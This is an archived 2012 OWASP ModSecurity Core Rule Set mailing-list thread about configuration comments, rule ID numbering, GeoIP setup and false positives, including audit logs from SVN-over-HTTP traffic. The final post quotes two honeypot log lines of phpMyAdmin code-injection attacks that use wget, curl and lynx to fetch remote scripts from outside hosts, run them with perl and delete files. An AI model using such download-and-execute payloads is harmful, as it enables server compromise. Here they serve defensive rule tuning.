From RBarnett at trustwave.com  Wed Jun  6 16:50:50 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Wed, 6 Jun 2012 11:50:50 -0500
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion Thread]
 10 Setup Conf File: Reference Recommended Base Config
In-Reply-To: <-7121284989596259125@unknownmsgid>
Message-ID: <CBF50149.504F5%rbarnett@trustwave.com>

I am beginning to update the modsecurity_crs_10_setup.conf file contents.  I will be sending out each section as I update it for feedback.

The first section I am adding to the beginning of this file is a reference to the recommended base configuration file that comes with the ModSecurity source archive.  We have found that many users are not using this file and there are some impacts to the rules. For example, if you have not defined SecRequestBodyAccess On, then the CRS rules will not be able to inspect request body ARGS.

I added the following comment text at the beginning of the file to ensure that CRS users are aware of the recommended base config file.

#
# -- [[ Recommended Base Configuration ]] -------------------------------------------------
#
# The configuration directives/settings in this file are used to control
# the OWASP ModSecurity CRS. These settings do **NOT** configure the main
# ModSecurity settings such as:
#
# - SecRuleEngine
# - SecRequestBodyAccess
# - SecAuditEngine
# - SecDebugLog
#
# You should use the modsecurity.conf-recommended file that comes with the
# ModSecurity source code archive.
#
# Ref: http://mod-security.svn.sourceforge.net/viewvc/mod-security/m2/trunk/modsecurity.conf-recommended
#

Comments welcome.

--
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader

________________________________
This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120606/a992ebc4/attachment-0003.html>

From RBarnett at trustwave.com  Wed Jun  6 16:53:07 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Wed, 6 Jun 2012 11:53:07 -0500
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion Thread]
 10 Setup Conf File: SecComponentSignature
In-Reply-To: <CBF50149.504F5%rbarnett@trustwave.com>
Message-ID: <CBF502DA.50503%rbarnett@trustwave.com>

Updated the following section to better describe its purpose and included a Ref link.

#
# -- [[ Rule Version ]] -------------------------------------------------------------------
#
# Rule version data is added to the "Producer" line of Section H of the Audit log:
#
# - Producer: ModSecurity for Apache/2.7.0-rc1 (http://www.modsecurity.org/); OWASP_CRS/2.2.4.
#
# Ref: https://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Reference_Manual#SecComponentSignature
#
SecComponentSignature "[% PRODUCT %]/[% VERSION %]"

--
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader

________________________________
This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120606/3198a335/attachment-0003.html>

From mark at intcom.nl  Wed Jun  6 20:40:39 2012
From: mark at intcom.nl (Mark Boos (IntCom))
Date: Wed, 6 Jun 2012 22:40:39 +0200
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
	Thread]Updating Rule IDs
In-Reply-To: <CBF5319E.5057D%rbarnett@trustwave.com>
Message-ID: <NDBBLMJIGLJAFKPADIIJKEIHHNAA.mark@intcom.nl>

> This brings up the issue of rule ID reuse.  Should
> we ever re-use a rule ID?
>From database point: don't re-use id's ; keep them unique.

An id should stay an id, nothing more nothing less; no categorizing or
re-using. What would be the benefit ?

I might be wrong, so i only speak from database perspective... Maybe there
are benefits of these ideas indeed that outweigh the disadvantages.

Regards
Mark


From klaubert at gmail.com  Wed Jun  6 22:39:15 2012
From: klaubert at gmail.com (Klaubert Herr da Silveira)
Date: Wed, 6 Jun 2012 19:39:15 -0300
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
 Thread]Updating Rule IDs
In-Reply-To: <NDBBLMJIGLJAFKPADIIJKEIHHNAA.mark@intcom.nl>
References: <CBF5319E.5057D%rbarnett@trustwave.com>
	<NDBBLMJIGLJAFKPADIIJKEIHHNAA.mark@intcom.nl>
Message-ID: <CAFoCuZp1QSy4YUHCjP5xh0+NBCkQNB04MciWy1ib290oQWHibQ@mail.gmail.com>

I agree with no id reuse, is not a big problem have some fragmentation
in id numbering. Making id's unique, can avoid mistakes mainly in
custom rules, how many users changes rules and keep original ID? Bad
practice, but probably it exist.

Klaubert Herr

On Wed, Jun 6, 2012 at 5:40 PM, Mark Boos (IntCom) <mark at intcom.nl> wrote:
>> This brings up the issue of rule ID reuse. ?Should
>> we ever re-use a rule ID?
> From database point: don't re-use id's ; keep them unique.
>
> An id should stay an id, nothing more nothing less; no categorizing or
> re-using. What would be the benefit ?
>
> I might be wrong, so i only speak from database perspective... Maybe there
> are benefits of these ideas indeed that outweigh the disadvantages.
>
> Regards
> Mark
>
>
>
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

From klaubert at gmail.com  Wed Jun  6 22:47:04 2012
From: klaubert at gmail.com (Klaubert Herr da Silveira)
Date: Wed, 6 Jun 2012 19:47:04 -0300
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
 Thread] Updating Rule IDs
In-Reply-To: <CBF4E03D.504B3%rbarnett@trustwave.com>
References: <CBF4E03D.504B3%rbarnett@trustwave.com>
Message-ID: <CAFoCuZqaazJ3+bwP+K5XyC8YKHMFG+Cvu3n2A_eVg4RWkoEA6w@mail.gmail.com>

Ryan,

The "highly optimized regexes" will be written optimized or will be
optimized by a tool? If is written and then optimized, will be very
useful to have the "source" for debuging purpose, like a version
minified and a standard version of a js lib.

Klaubert Herr

On Wed, Jun 6, 2012 at 11:23 AM, Ryan Barnett <RBarnett at trustwave.com> wrote:
> One of the items we are considering with the CRS v3.0 update is to start
> from scratch with all of the rule IDs. ?We have a defined range reserved for
> the OWASP CRS -
> https://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Reference_Manual#id
>
> 900,000?999,999: reserved for the OWASP ModSecurity Core Rule
> Set?[12]?project
>
> The rationale for this change is to make it easier to users to do exceptions
> and disable groups of rules by using SecRuleRemoveById, etc? That directive
> has the capability to remove ranges?of rule IDs, however over the years the
> rule IDs were added ad-hoc and they are not properly grouped in this manner.
> ?For instance, groupings could be something similar to this -
>
> Protocol Violation ? 900000-900099
> Protocol Policies - 900100?900199
> Cross-site Scripting - 900200?900299
> ?
>
> We would give each rule group approx 100 rule IDs. ?The initial number would
> be less than that which would allow some growth. ?After some analysis of the
> current rules, we really shouldn't ever exceed those allotments as there
> ends up being rule logic duplication and you just end up with bloated rule
> amounts.
>
> Keep in mind that the active rule IDs were going to change a bit anyways
> with this update as we will be consolidating many rules into highly
> optimized regexes, etc..
>
> The only concern that I have with making this move would be if users have
> extensively implemented exceptions based on the current rule IDs. ?They
> would need to be aware of this when they migrate to v3.0.
>
> Comments?
>
> --
> Ryan Barnett
> Trustwave SpiderLabs
> ModSecurity Project Leader
> OWASP ModSecurity CRS Project Leader
>
> ________________________________
> This transmission may contain information that is privileged, confidential,
> and/or exempt from disclosure under applicable law. If you are not the
> intended recipient, you are hereby notified that any disclosure, copying,
> distribution, or use of the information contained herein (including any
> reliance thereon) is STRICTLY PROHIBITED. If you received this transmission
> in error, please immediately contact the sender and destroy the material in
> its entirety, whether in electronic or hard copy format.
>
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
>

From RBarnett at trustwave.com  Thu Jun  7 00:09:20 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Wed, 6 Jun 2012 19:09:20 -0500
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
 Thread] Updating Rule IDs
In-Reply-To: <CAFoCuZqaazJ3+bwP+K5XyC8YKHMFG+Cvu3n2A_eVg4RWkoEA6w@mail.gmail.com>
Message-ID: <CBF561BE.505B1%rbarnett@trustwave.com>


On 6/6/12 6:47 PM, "Klaubert Herr da Silveira" <klaubert at gmail.com> wrote:

>Ryan,
>
>The "highly optimized regexes" will be written optimized or will be
>optimized by a tool? If is written and then optimized, will be very
>useful to have the "source" for debuging purpose, like a version
>minified and a standard version of a js lib.

Yes, we can do that.  Just to be clear, we are planning on extensively
using the @pm/@pmf to do fast pre-qualification of groups of rules.  If
these rules match, then we will execute the optimized regular expression
rules.  What we can do is provide the smaller regex sources with Apache
comments prior to the rules.

So, you would really have two ways of knowing the source data for the
optimized regexes:
1) The plain text string pm data, and
2) The smaller, individual regexes.

-Ryan

>
>Klaubert Herr
>
>On Wed, Jun 6, 2012 at 11:23 AM, Ryan Barnett <RBarnett at trustwave.com>
>wrote:
>> One of the items we are considering with the CRS v3.0 update is to start
>> from scratch with all of the rule IDs.  We have a defined range
>>reserved for
>> the OWASP CRS -
>>
>>https://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Refer
>>ence_Manual#id
>>
>> 900,000?999,999: reserved for the OWASP ModSecurity Core Rule
>> Set [12] project
>>
>> The rationale for this change is to make it easier to users to do
>>exceptions
>> and disable groups of rules by using SecRuleRemoveById, etc? That
>>directive
>> has the capability to remove ranges of rule IDs, however over the years
>>the
>> rule IDs were added ad-hoc and they are not properly grouped in this
>>manner.
>>  For instance, groupings could be something similar to this -
>>
>> Protocol Violation ? 900000-900099
>> Protocol Policies - 900100?900199
>> Cross-site Scripting - 900200?900299
>> ?
>>
>> We would give each rule group approx 100 rule IDs.  The initial number
>>would
>> be less than that which would allow some growth.  After some analysis
>>of the
>> current rules, we really shouldn't ever exceed those allotments as there
>> ends up being rule logic duplication and you just end up with bloated
>>rule
>> amounts.
>>
>> Keep in mind that the active rule IDs were going to change a bit anyways
>> with this update as we will be consolidating many rules into highly
>> optimized regexes, etc..
>>
>> The only concern that I have with making this move would be if users
>>have
>> extensively implemented exceptions based on the current rule IDs.  They
>> would need to be aware of this when they migrate to v3.0.
>>
>> Comments?
>>
>> --
>> Ryan Barnett
>> Trustwave SpiderLabs
>> ModSecurity Project Leader
>> OWASP ModSecurity CRS Project Leader
>>
>> ________________________________
>> This transmission may contain information that is privileged,
>>confidential,
>> and/or exempt from disclosure under applicable law. If you are not the
>> intended recipient, you are hereby notified that any disclosure,
>>copying,
>> distribution, or use of the information contained herein (including any
>> reliance thereon) is STRICTLY PROHIBITED. If you received this
>>transmission
>> in error, please immediately contact the sender and destroy the
>>material in
>> its entirety, whether in electronic or hard copy format.
>>
>> _______________________________________________
>> Owasp-modsecurity-core-rule-set mailing list
>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
>>
>


This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.


From RBarnett at trustwave.com  Thu Jun  7 14:59:33 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Thu, 7 Jun 2012 09:59:33 -0500
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion Thread]
	GeoIP Database
In-Reply-To: <CBE40FF6.4E7CE%rbarnett@trustwave.com>
Message-ID: <CBF63692.506F6%rbarnett@trustwave.com>

Wanted to get feedback on GeoIP DB activation.  Here is what is in the
current modsecurity_crs_10_setup.conf file -

#
# -- [[ GeoIP Database ]]
-----------------------------------------------------------------
#
# There are some rulesets that need to inspect the GEO data of the
REMOTE_ADDR data.
#
# You must first download the MaxMind GeoIP Lite City DB -
#
#
http://geolite.maxmind.com/download/geoip/database/GeoLiteCity.dat.gz
#
# You then need to define the proper path for the SecGeoLookupDb directive
#
# Ref:
http://blog.spiderlabs.com/2010/10/detecting-malice-with-modsecurity-geoloc
ation-data.html
#

SecGeoLookupDb /usr/local/apache/conf/modsec/GeoLiteCity.dat

The rationale for this directive is that we will be added rules that need
to inspect the GEO collection data to identify potential fraud, raise risk
scores and provide GeoIP data within generated alerts.  Does anyone have
any issues with the SecGeoLookupDd directive to be activated by default or
should this be commented out and the user can activate it if they want to
use GeoIP data?



--
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader


This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.


From RBarnett at trustwave.com  Thu Jun  7 15:14:20 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Thu, 7 Jun 2012 10:14:20 -0500
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion Thread]
	Converted Snort Signatures
In-Reply-To: <CBE40FF6.4E7CE%rbarnett@trustwave.com>
Message-ID: <CBF63D42.50788%rbarnett@trustwave.com>

Does anyone use the converted snort signatures under the slr_rules
directory?  Trying to decide whether or not to keep them in the archive.

--
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader


This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.


From RBarnett at trustwave.com  Thu Jun  7 15:32:54 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Thu, 7 Jun 2012 10:32:54 -0500
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion Thread]
	Skype Chat
In-Reply-To: <CBE40FF6.4E7CE%rbarnett@trustwave.com>
Message-ID: <CBF6418E.507D9%rbarnett@trustwave.com>

We are starting a Skype chat channel to discuss the CRS updates.  If you
want to join in the discussions, send me your contact info (rcbarnett) and
I will add you to the live chat :)

--
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader


This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.


From rbarnett at trustwave.com  Fri Jun  8 14:11:22 2012
From: rbarnett at trustwave.com (Ryan Barnett (JIRA))
Date: Fri, 8 Jun 2012 09:11:22 -0500 (CDT)
Subject: [Owasp-modsecurity-core-rule-set] [JIRA] Resolved: (CORERULES-77)
 Modsecurity creates fall positives when used with SVN-over-HTTP
Message-ID: <360539200.4919.1339164682009.JavaMail.root@modsec-apps.modsecurity.org>


     [ https://www.modsecurity.org/tracker/browse/CORERULES-77?page=com.atlassian.jira.plugin.system.issuetabpanels:all-tabpanel ]

Ryan Barnett resolved CORERULES-77.
-----------------------------------

    Resolution: Fixed

Provided an exception example for SVN traffic.

> Modsecurity creates fall positives when used with SVN-over-HTTP
> ---------------------------------------------------------------
>
>                 Key: CORERULES-77
>                 URL: https://www.modsecurity.org/tracker/browse/CORERULES-77
>             Project: Core Rules
>          Issue Type: Bug
>      Security Level: Normal
>          Components: False positive
>         Environment: Fedora 16 (updated) on x86_64 hardware.
>            Reporter: Philip Prindeville
>            Assignee: Ryan Barnett
>
> Seeing the following:
> --99fa9461-A--
> [05/Sep/2011:11:23:29 --0600] TmUFkcCoAQoAABnnJF8AAAAD ::1 52681 ::1 80
> --99fa9461-B--
> PROPFIND /svn/astlinux/trunk/package/linux-atm HTTP/1.1
> User-Agent: SVN/1.6.17 (r1128011) neon/0.29.5
> Connection: TE
> TE: trailers
> Host: localhost
> Content-Type: text/xml
> Accept-Encoding: gzip, gzip
> Depth: 0
> DAV: http://subversion.tigris.org/xmlns/dav/svn/depth, http://subversion.tigris.org/xmlns/dav/svn/mergeinfo, http://subversion.tigris.org/xmlns/dav/svn/log-revprops
> Content-Length: 300
> --99fa9461-C--
> <?xml version="1.0" encoding="utf-8"?><propfind xmlns="DAV:"><prop><version-controlled-configuration xmlns="DAV:"/><resourcetype xmlns="DAV:"/><baseline-relative-path xmlns="http://subversion.tigris.org/xmlns/dav/"/><repository-uuid xmlns="http://subversion.tigris.org/xmlns/dav/"/></prop></propfind>
> --99fa9461-F--
> HTTP/1.1 207 Multi-Status
> Content-Length: 730
> Connection: close
> Content-Type: text/xml; charset="utf-8"
> --99fa9461-H--
> Message: Match of "rx ^OPTIONS$" against "REQUEST_METHOD" required. [file "/etc/httpd/modsecurity.d/base_rules/modsecurity_crs_21_protocol_anomalies.conf"] [line "46"] [id "960015"] [rev "2.0.5"] [msg "Request Missing an Accept Header"] [severity "CRITICAL"] [tag "PROTOCOL_VIOLATION/MISSING_HEADER"] [tag "WASCTC/WASC-21"] [tag "OWASP_TOP_10/A7"] [tag "PCI/6.5.10"]
> Message: Match of "within %{tx.allowed_methods}" against "REQUEST_METHOD" required. [file "/etc/httpd/modsecurity.d/base_rules/modsecurity_crs_30_http_policy.conf"] [line "30"] [id "960032"] [msg "Method is not allowed by policy"] [data "PROPFIND"] [severity "CRITICAL"] [tag "POLICY/METHOD_NOT_ALLOWED"] [tag "WASCTC/WASC-15"] [tag "OWASP_TOP_10/A6"] [tag "OWASP_AppSensor/RE1"] [tag "PCI/12.1"]
> Message: Warning. Operator LT matched 20 at TX:inbound_anomaly_score. [file "/etc/httpd/modsecurity.d/base_rules/modsecurity_crs_60_correlation.conf"] [line "31"] [msg "Inbound Anomaly Score (Total Inbound Score: 15, SQLi=, XSS=): Method is not allowed by policy"]
> Apache-Handler: dav-handler
> Stopwatch: 1315243409177653 15221 (1631* 4042 -)
> Producer: ModSecurity for Apache/2.5.12 (http://www.modsecurity.org/); core ruleset/2.0.5.
> Server: Apache/2.2.19 (Fedora)
> --99fa9461-Z--
> --99fa9461-A--
> [05/Sep/2011:11:23:29 --0600] TmUFkcCoAQoAABnlI-4AAAAB ::1 52683 ::1 80
> --99fa9461-B--
> MKACTIVITY /svn/astlinux/!svn/act/709637a8-16ca-40eb-8008-8cb9d5bd189c HTTP/1.1
> User-Agent: SVN/1.6.17 (r1128011) neon/0.29.5
> Connection: TE
> TE: trailers
> Host: localhost
> Accept-Encoding: gzip, gzip
> DAV: http://subversion.tigris.org/xmlns/dav/svn/depth, http://subversion.tigris.org/xmlns/dav/svn/mergeinfo, http://subversion.tigris.org/xmlns/dav/svn/log-revprops
> Content-Length: 0
> Authorization: Digest username="philipp", realm="Subversion repository", nonce="+5sy+DSsBAA=d9c09363220f392546430d28d12b6348d29b7276", uri="/svn/astlinux/!svn/act/709637a8-16ca-40eb-8008-8cb9d5bd189c", response="e2528cc38f97a310abcb6a0559bf7ac4", algorithm="MD5", cnonce="1b8d984a50488ce67a674ab9a90612fc", nc=00000001, qop="auth"
> --99fa9461-C--
> --99fa9461-F--
> HTTP/1.1 201 Created
> Authentication-Info: rspauth="deb189790e5971076389e53d958cb158", cnonce="1b8d984a50488ce67a674ab9a90612fc", nc=00000001, qop=auth
> Cache-Control: no-cache
> Location: http://localhost/svn/astlinux/!svn/act/709637a8-16ca-40eb-8008-8cb9d5bd189c
> Content-Length: 308
> Connection: close
> Content-Type: text/html; charset=ISO-8859-1
> --99fa9461-H--
> Message: Match of "rx ^OPTIONS$" against "REQUEST_METHOD" required. [file "/etc/httpd/modsecurity.d/base_rules/modsecurity_crs_21_protocol_anomalies.conf"] [line "46"] [id "960015"] [rev "2.0.5"] [msg "Request Missing an Accept Header"] [severity "CRITICAL"] [tag "PROTOCOL_VIOLATION/MISSING_HEADER"] [tag "WASCTC/WASC-21"] [tag "OWASP_TOP_10/A7"] [tag "PCI/6.5.10"]
> Message: Match of "within %{tx.allowed_methods}" against "REQUEST_METHOD" required. [file "/etc/httpd/modsecurity.d/base_rules/modsecurity_crs_30_http_policy.conf"] [line "30"] [id "960032"] [msg "Method is not allowed by policy"] [data "MKACTIVITY"] [severity "CRITICAL"] [tag "POLICY/METHOD_NOT_ALLOWED"] [tag "WASCTC/WASC-15"] [tag "OWASP_TOP_10/A6"] [tag "OWASP_AppSensor/RE1"] [tag "PCI/12.1"]
> Message: Warning. Operator LT matched 20 at TX:inbound_anomaly_score. [file "/etc/httpd/modsecurity.d/base_rules/modsecurity_crs_60_correlation.conf"] [line "31"] [msg "Inbound Anomaly Score (Total Inbound Score: 15, SQLi=, XSS=): Method is not allowed by policy"]
> Apache-Handler: dav-handler
> Stopwatch: 1315243409275410 102579 (26119* 28723 -)
> Producer: ModSecurity for Apache/2.5.12 (http://www.modsecurity.org/); core ruleset/2.0.5.
> Server: Apache/2.2.19 (Fedora)
> --99fa9461-Z--
> --99fa9461-A--
> [05/Sep/2011:11:23:29 --0600] TmUFkcCoAQoAABnmJFgAAAAC ::1 52684 ::1 80
> --99fa9461-B--
> CHECKOUT /svn/astlinux/!svn/vcc/default HTTP/1.1
> User-Agent: SVN/1.6.17 (r1128011) neon/0.29.5
> Connection: TE
> TE: trailers
> Host: localhost
> DAV: http://subversion.tigris.org/xmlns/dav/svn/depth, http://subversion.tigris.org/xmlns/dav/svn/mergeinfo, http://subversion.tigris.org/xmlns/dav/svn/log-revprops
> Content-Length: 208
> Accept-Encoding: gzip
> Authorization: Digest username="philipp", realm="Subversion repository", nonce="+5sy+DSsBAA=d9c09363220f392546430d28d12b6348d29b7276", uri="/svn/astlinux/!svn/vcc/default", response="2e41665162866967cf328e068a7b6bf0", algorithm="MD5", cnonce="1b8d984a50488ce67a674ab9a90612fc", nc=00000002, qop="auth"
> --99fa9461-C--
> <?xml version="1.0" encoding="utf-8"?><D:checkout xmlns:D="DAV:"><D:activity-set><D:href>/svn/astlinux/!svn/act/709637a8-16ca-40eb-8008-8cb9d5bd189c</D:href></D:activity-set><D:apply-to-version/></D:checkout>
> --99fa9461-F--
> HTTP/1.1 403 Forbidden
> Content-Length: 306
> Connection: close
> Content-Type: text/html; charset=iso-8859-1
> --99fa9461-H--
> Message: Match of "rx ^OPTIONS$" against "REQUEST_METHOD" required. [file "/etc/httpd/modsecurity.d/base_rules/modsecurity_crs_21_protocol_anomalies.conf"] [line "46"] [id "960015"] [rev "2.0.5"] [msg "Request Missing an Accept Header"] [severity "CRITICAL"] [tag "PROTOCOL_VIOLATION/MISSING_HEADER"] [tag "WASCTC/WASC-21"] [tag "OWASP_TOP_10/A7"] [tag "PCI/6.5.10"]
> Message: Match of "rx ^0$" against "REQUEST_HEADERS:Content-Length" required. [file "/etc/httpd/modsecurity.d/base_rules/modsecurity_crs_21_protocol_anomalies.conf"] [line "83"] [id "960904"] [rev "2.0.5"] [msg "Request Containing Content, but Missing Content-Type header"] [severity "NOTICE"]
> Message: Match of "within %{tx.allowed_methods}" against "REQUEST_METHOD" required. [file "/etc/httpd/modsecurity.d/base_rules/modsecurity_crs_30_http_policy.conf"] [line "30"] [id "960032"] [msg "Method is not allowed by policy"] [data "CHECKOUT"] [severity "CRITICAL"] [tag "POLICY/METHOD_NOT_ALLOWED"] [tag "WASCTC/WASC-15"] [tag "OWASP_TOP_10/A6"] [tag "OWASP_AppSensor/RE1"] [tag "PCI/12.1"]
> Message: Access denied with code 403 (phase 2). [file "/etc/httpd/modsecurity.d/base_rules/modsecurity_crs_49_enforcement.conf"] [line "25"] [msg "Anomaly Score Exceeded (score 20): Method is not allowed by policy"]
> Action: Intercepted (phase 2)
> Stopwatch: 1315243409378229 4605 (1720* 4100 -)
> Producer: ModSecurity for Apache/2.5.12 (http://www.modsecurity.org/); core ruleset/2.0.5.
> Server: Apache/2.2.19 (Fedora)
> --99fa9461-Z--
> --99fa9461-A--
> [05/Sep/2011:11:23:29 --0600] TmUFkcCoAQoAABnkI6QAAAAA ::1 52685 ::1 80
> --99fa9461-B--
> DELETE /svn/astlinux/!svn/act/709637a8-16ca-40eb-8008-8cb9d5bd189c HTTP/1.1
> User-Agent: SVN/1.6.17 (r1128011) neon/0.29.5
> Connection: TE
> TE: trailers
> Host: localhost
> Accept-Encoding: gzip, gzip
> DAV: http://subversion.tigris.org/xmlns/dav/svn/depth, http://subversion.tigris.org/xmlns/dav/svn/mergeinfo, http://subversion.tigris.org/xmlns/dav/svn/log-revprops
> Content-Length: 0
> Authorization: Digest username="philipp", realm="Subversion repository", nonce="+5sy+DSsBAA=d9c09363220f392546430d28d12b6348d29b7276", uri="/svn/astlinux/!svn/act/709637a8-16ca-40eb-8008-8cb9d5bd189c", response="0b2831fb296127fc8e156f7be91ce5bc", algorithm="MD5", cnonce="1b8d984a50488ce67a674ab9a90612fc", nc=00000003, qop="auth"
> --99fa9461-C--
> --99fa9461-F--
> HTTP/1.1 204 No Content
> Authentication-Info: rspauth="0f23d425afe38d8fe4fd5e030e5184d3", cnonce="1b8d984a50488ce67a674ab9a90612fc", nc=00000003, qop=auth
> Content-Length: 0
> Connection: close
> Content-Type: text/plain; charset=UTF-8
> --99fa9461-H--
> Message: Match of "rx ^OPTIONS$" against "REQUEST_METHOD" required. [file "/etc/httpd/modsecurity.d/base_rules/modsecurity_crs_21_protocol_anomalies.conf"] [line "46"] [id "960015"] [rev "2.0.5"] [msg "Request Missing an Accept Header"] [severity "CRITICAL"] [tag "PROTOCOL_VIOLATION/MISSING_HEADER"] [tag "WASCTC/WASC-21"] [tag "OWASP_TOP_10/A7"] [tag "PCI/6.5.10"]
> Message: Match of "within %{tx.allowed_methods}" against "REQUEST_METHOD" required. [file "/etc/httpd/modsecurity.d/base_rules/modsecurity_crs_30_http_policy.conf"] [line "30"] [id "960032"] [msg "Method is not allowed by policy"] [data "DELETE"] [severity "CRITICAL"] [tag "POLICY/METHOD_NOT_ALLOWED"] [tag "WASCTC/WASC-15"] [tag "OWASP_TOP_10/A6"] [tag "OWASP_AppSensor/RE1"] [tag "PCI/12.1"]
> Message: Warning. Operator LT matched 20 at TX:inbound_anomaly_score. [file "/etc/httpd/modsecurity.d/base_rules/modsecurity_crs_60_correlation.conf"] [line "31"] [msg "Inbound Anomaly Score (Total Inbound Score: 15, SQLi=, XSS=): Method is not allowed by policy"]
> Apache-Handler: dav-handler
> Stopwatch: 1315243409383180 6291 (1711* 4241 -)
> Producer: ModSecurity for Apache/2.5.12 (http://www.modsecurity.org/); core ruleset/2.0.5.
> Server: Apache/2.2.19 (Fedora)
> --99fa9461-Z--
> A partial fix was suggested as:
> <Location /svn>
>    ...
>    <IfModule mod_security2.c>
>       # SecRuleRemoveByTag "TX:INBOUND_ANOMALY_SCORE"
>       SecRule REQUEST_METHOD "^(PROPFIND|PROPPATH$)" allow
>       SecRule REQUEST_METHOD "^(REPORT|OPTIONS)$" allow
>       SecRule REQUEST_METHOD "^(MKACTIVITY|CHECKOUT)$" allow
>       SecRule REQUEST_METHOD "^(PUT|DELETE|MERGE)$" allow
>       SecRule REQUEST_METHOD "^(MKCOL)$" allow
>    </IfModule>
>    ...
> </Location>
> as a workaround, but this still results in some false positives.

--
This message is automatically generated by JIRA.
For more information on JIRA, see: http://www.atlassian.com/software/jira

        


From RBarnett at trustwave.com  Fri Jun  8 19:35:46 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Fri, 8 Jun 2012 14:35:46 -0500
Subject: [Owasp-modsecurity-core-rule-set] False Positives with OS Commands
Message-ID: <CBF7CC52.51CC3%rbarnett@trustwave.com>

I am reviewing an old CRS Jira ticket on a false positive hit for the "curl" command - https://www.modsecurity.org/tracker/browse/CORERULES-78

In reviewing this, it looks like we need to remove the REQUEST_FILENAME from the list of vars inspected.  From my research, the only really location to look for OS command injection is within ARGS or REQUEST_HEADERS.  As an example, look at this recent blog post I did with some example attacks targeting curl - http://blog.spiderlabs.com/2012/02/honeypot-alert-phpmyadmin-code-injection-attacks.html


62.149.12.62 - - [21/Feb/2012:04:25:55 -0600] "GET /mysql//config.sample.inc.php?eval=system('echo cd /tmp;wget http://199.115.228.9/vp.txt -O p2.txt;curl -O http://199.115.228.9/vp.txt; mv vp.txt d.txt;lyxn -DUMP http://199.115.228.9/vp.txt >p3.txt;perl d.txt; perl p2.txt;perl p3.txt;rm -rf *.txt'); HTTP/1.1" 404 226 "-" "curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.12.6.2 zlib/1.2.3 libidn/1.9 libssh2/1.2.4"

195.145.156.126 - - [21/Feb/2012:05:42:27 -0600] "GET /mysql/config/config.inc.php?eval=system('echo cd /tmp;wget http://dinte.altervista.org/apache_32.png -O p2.txt;curl -O http://dinte.altervista.org/apache_32.png; mv apache_32.png p.txt;lyxn -DUMP http://dinte.altervista.org/apache_32.png >p3.txt;perl p.txt; perl p2.txt;perl p3.txt;rm -rf *.txt'); HTTP/1.1" 404 225 "-" "curl/7.18.1 (i686-suse-linux-gnu) libcurl/7.18.1 OpenSSL/0.9.8g zlib/1.2.3 libidn/1.8"

These attacks are with ARGS.

Has anyone ever legitimately had an OS command attack targeting the REQUEST_FILENAME?

--
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
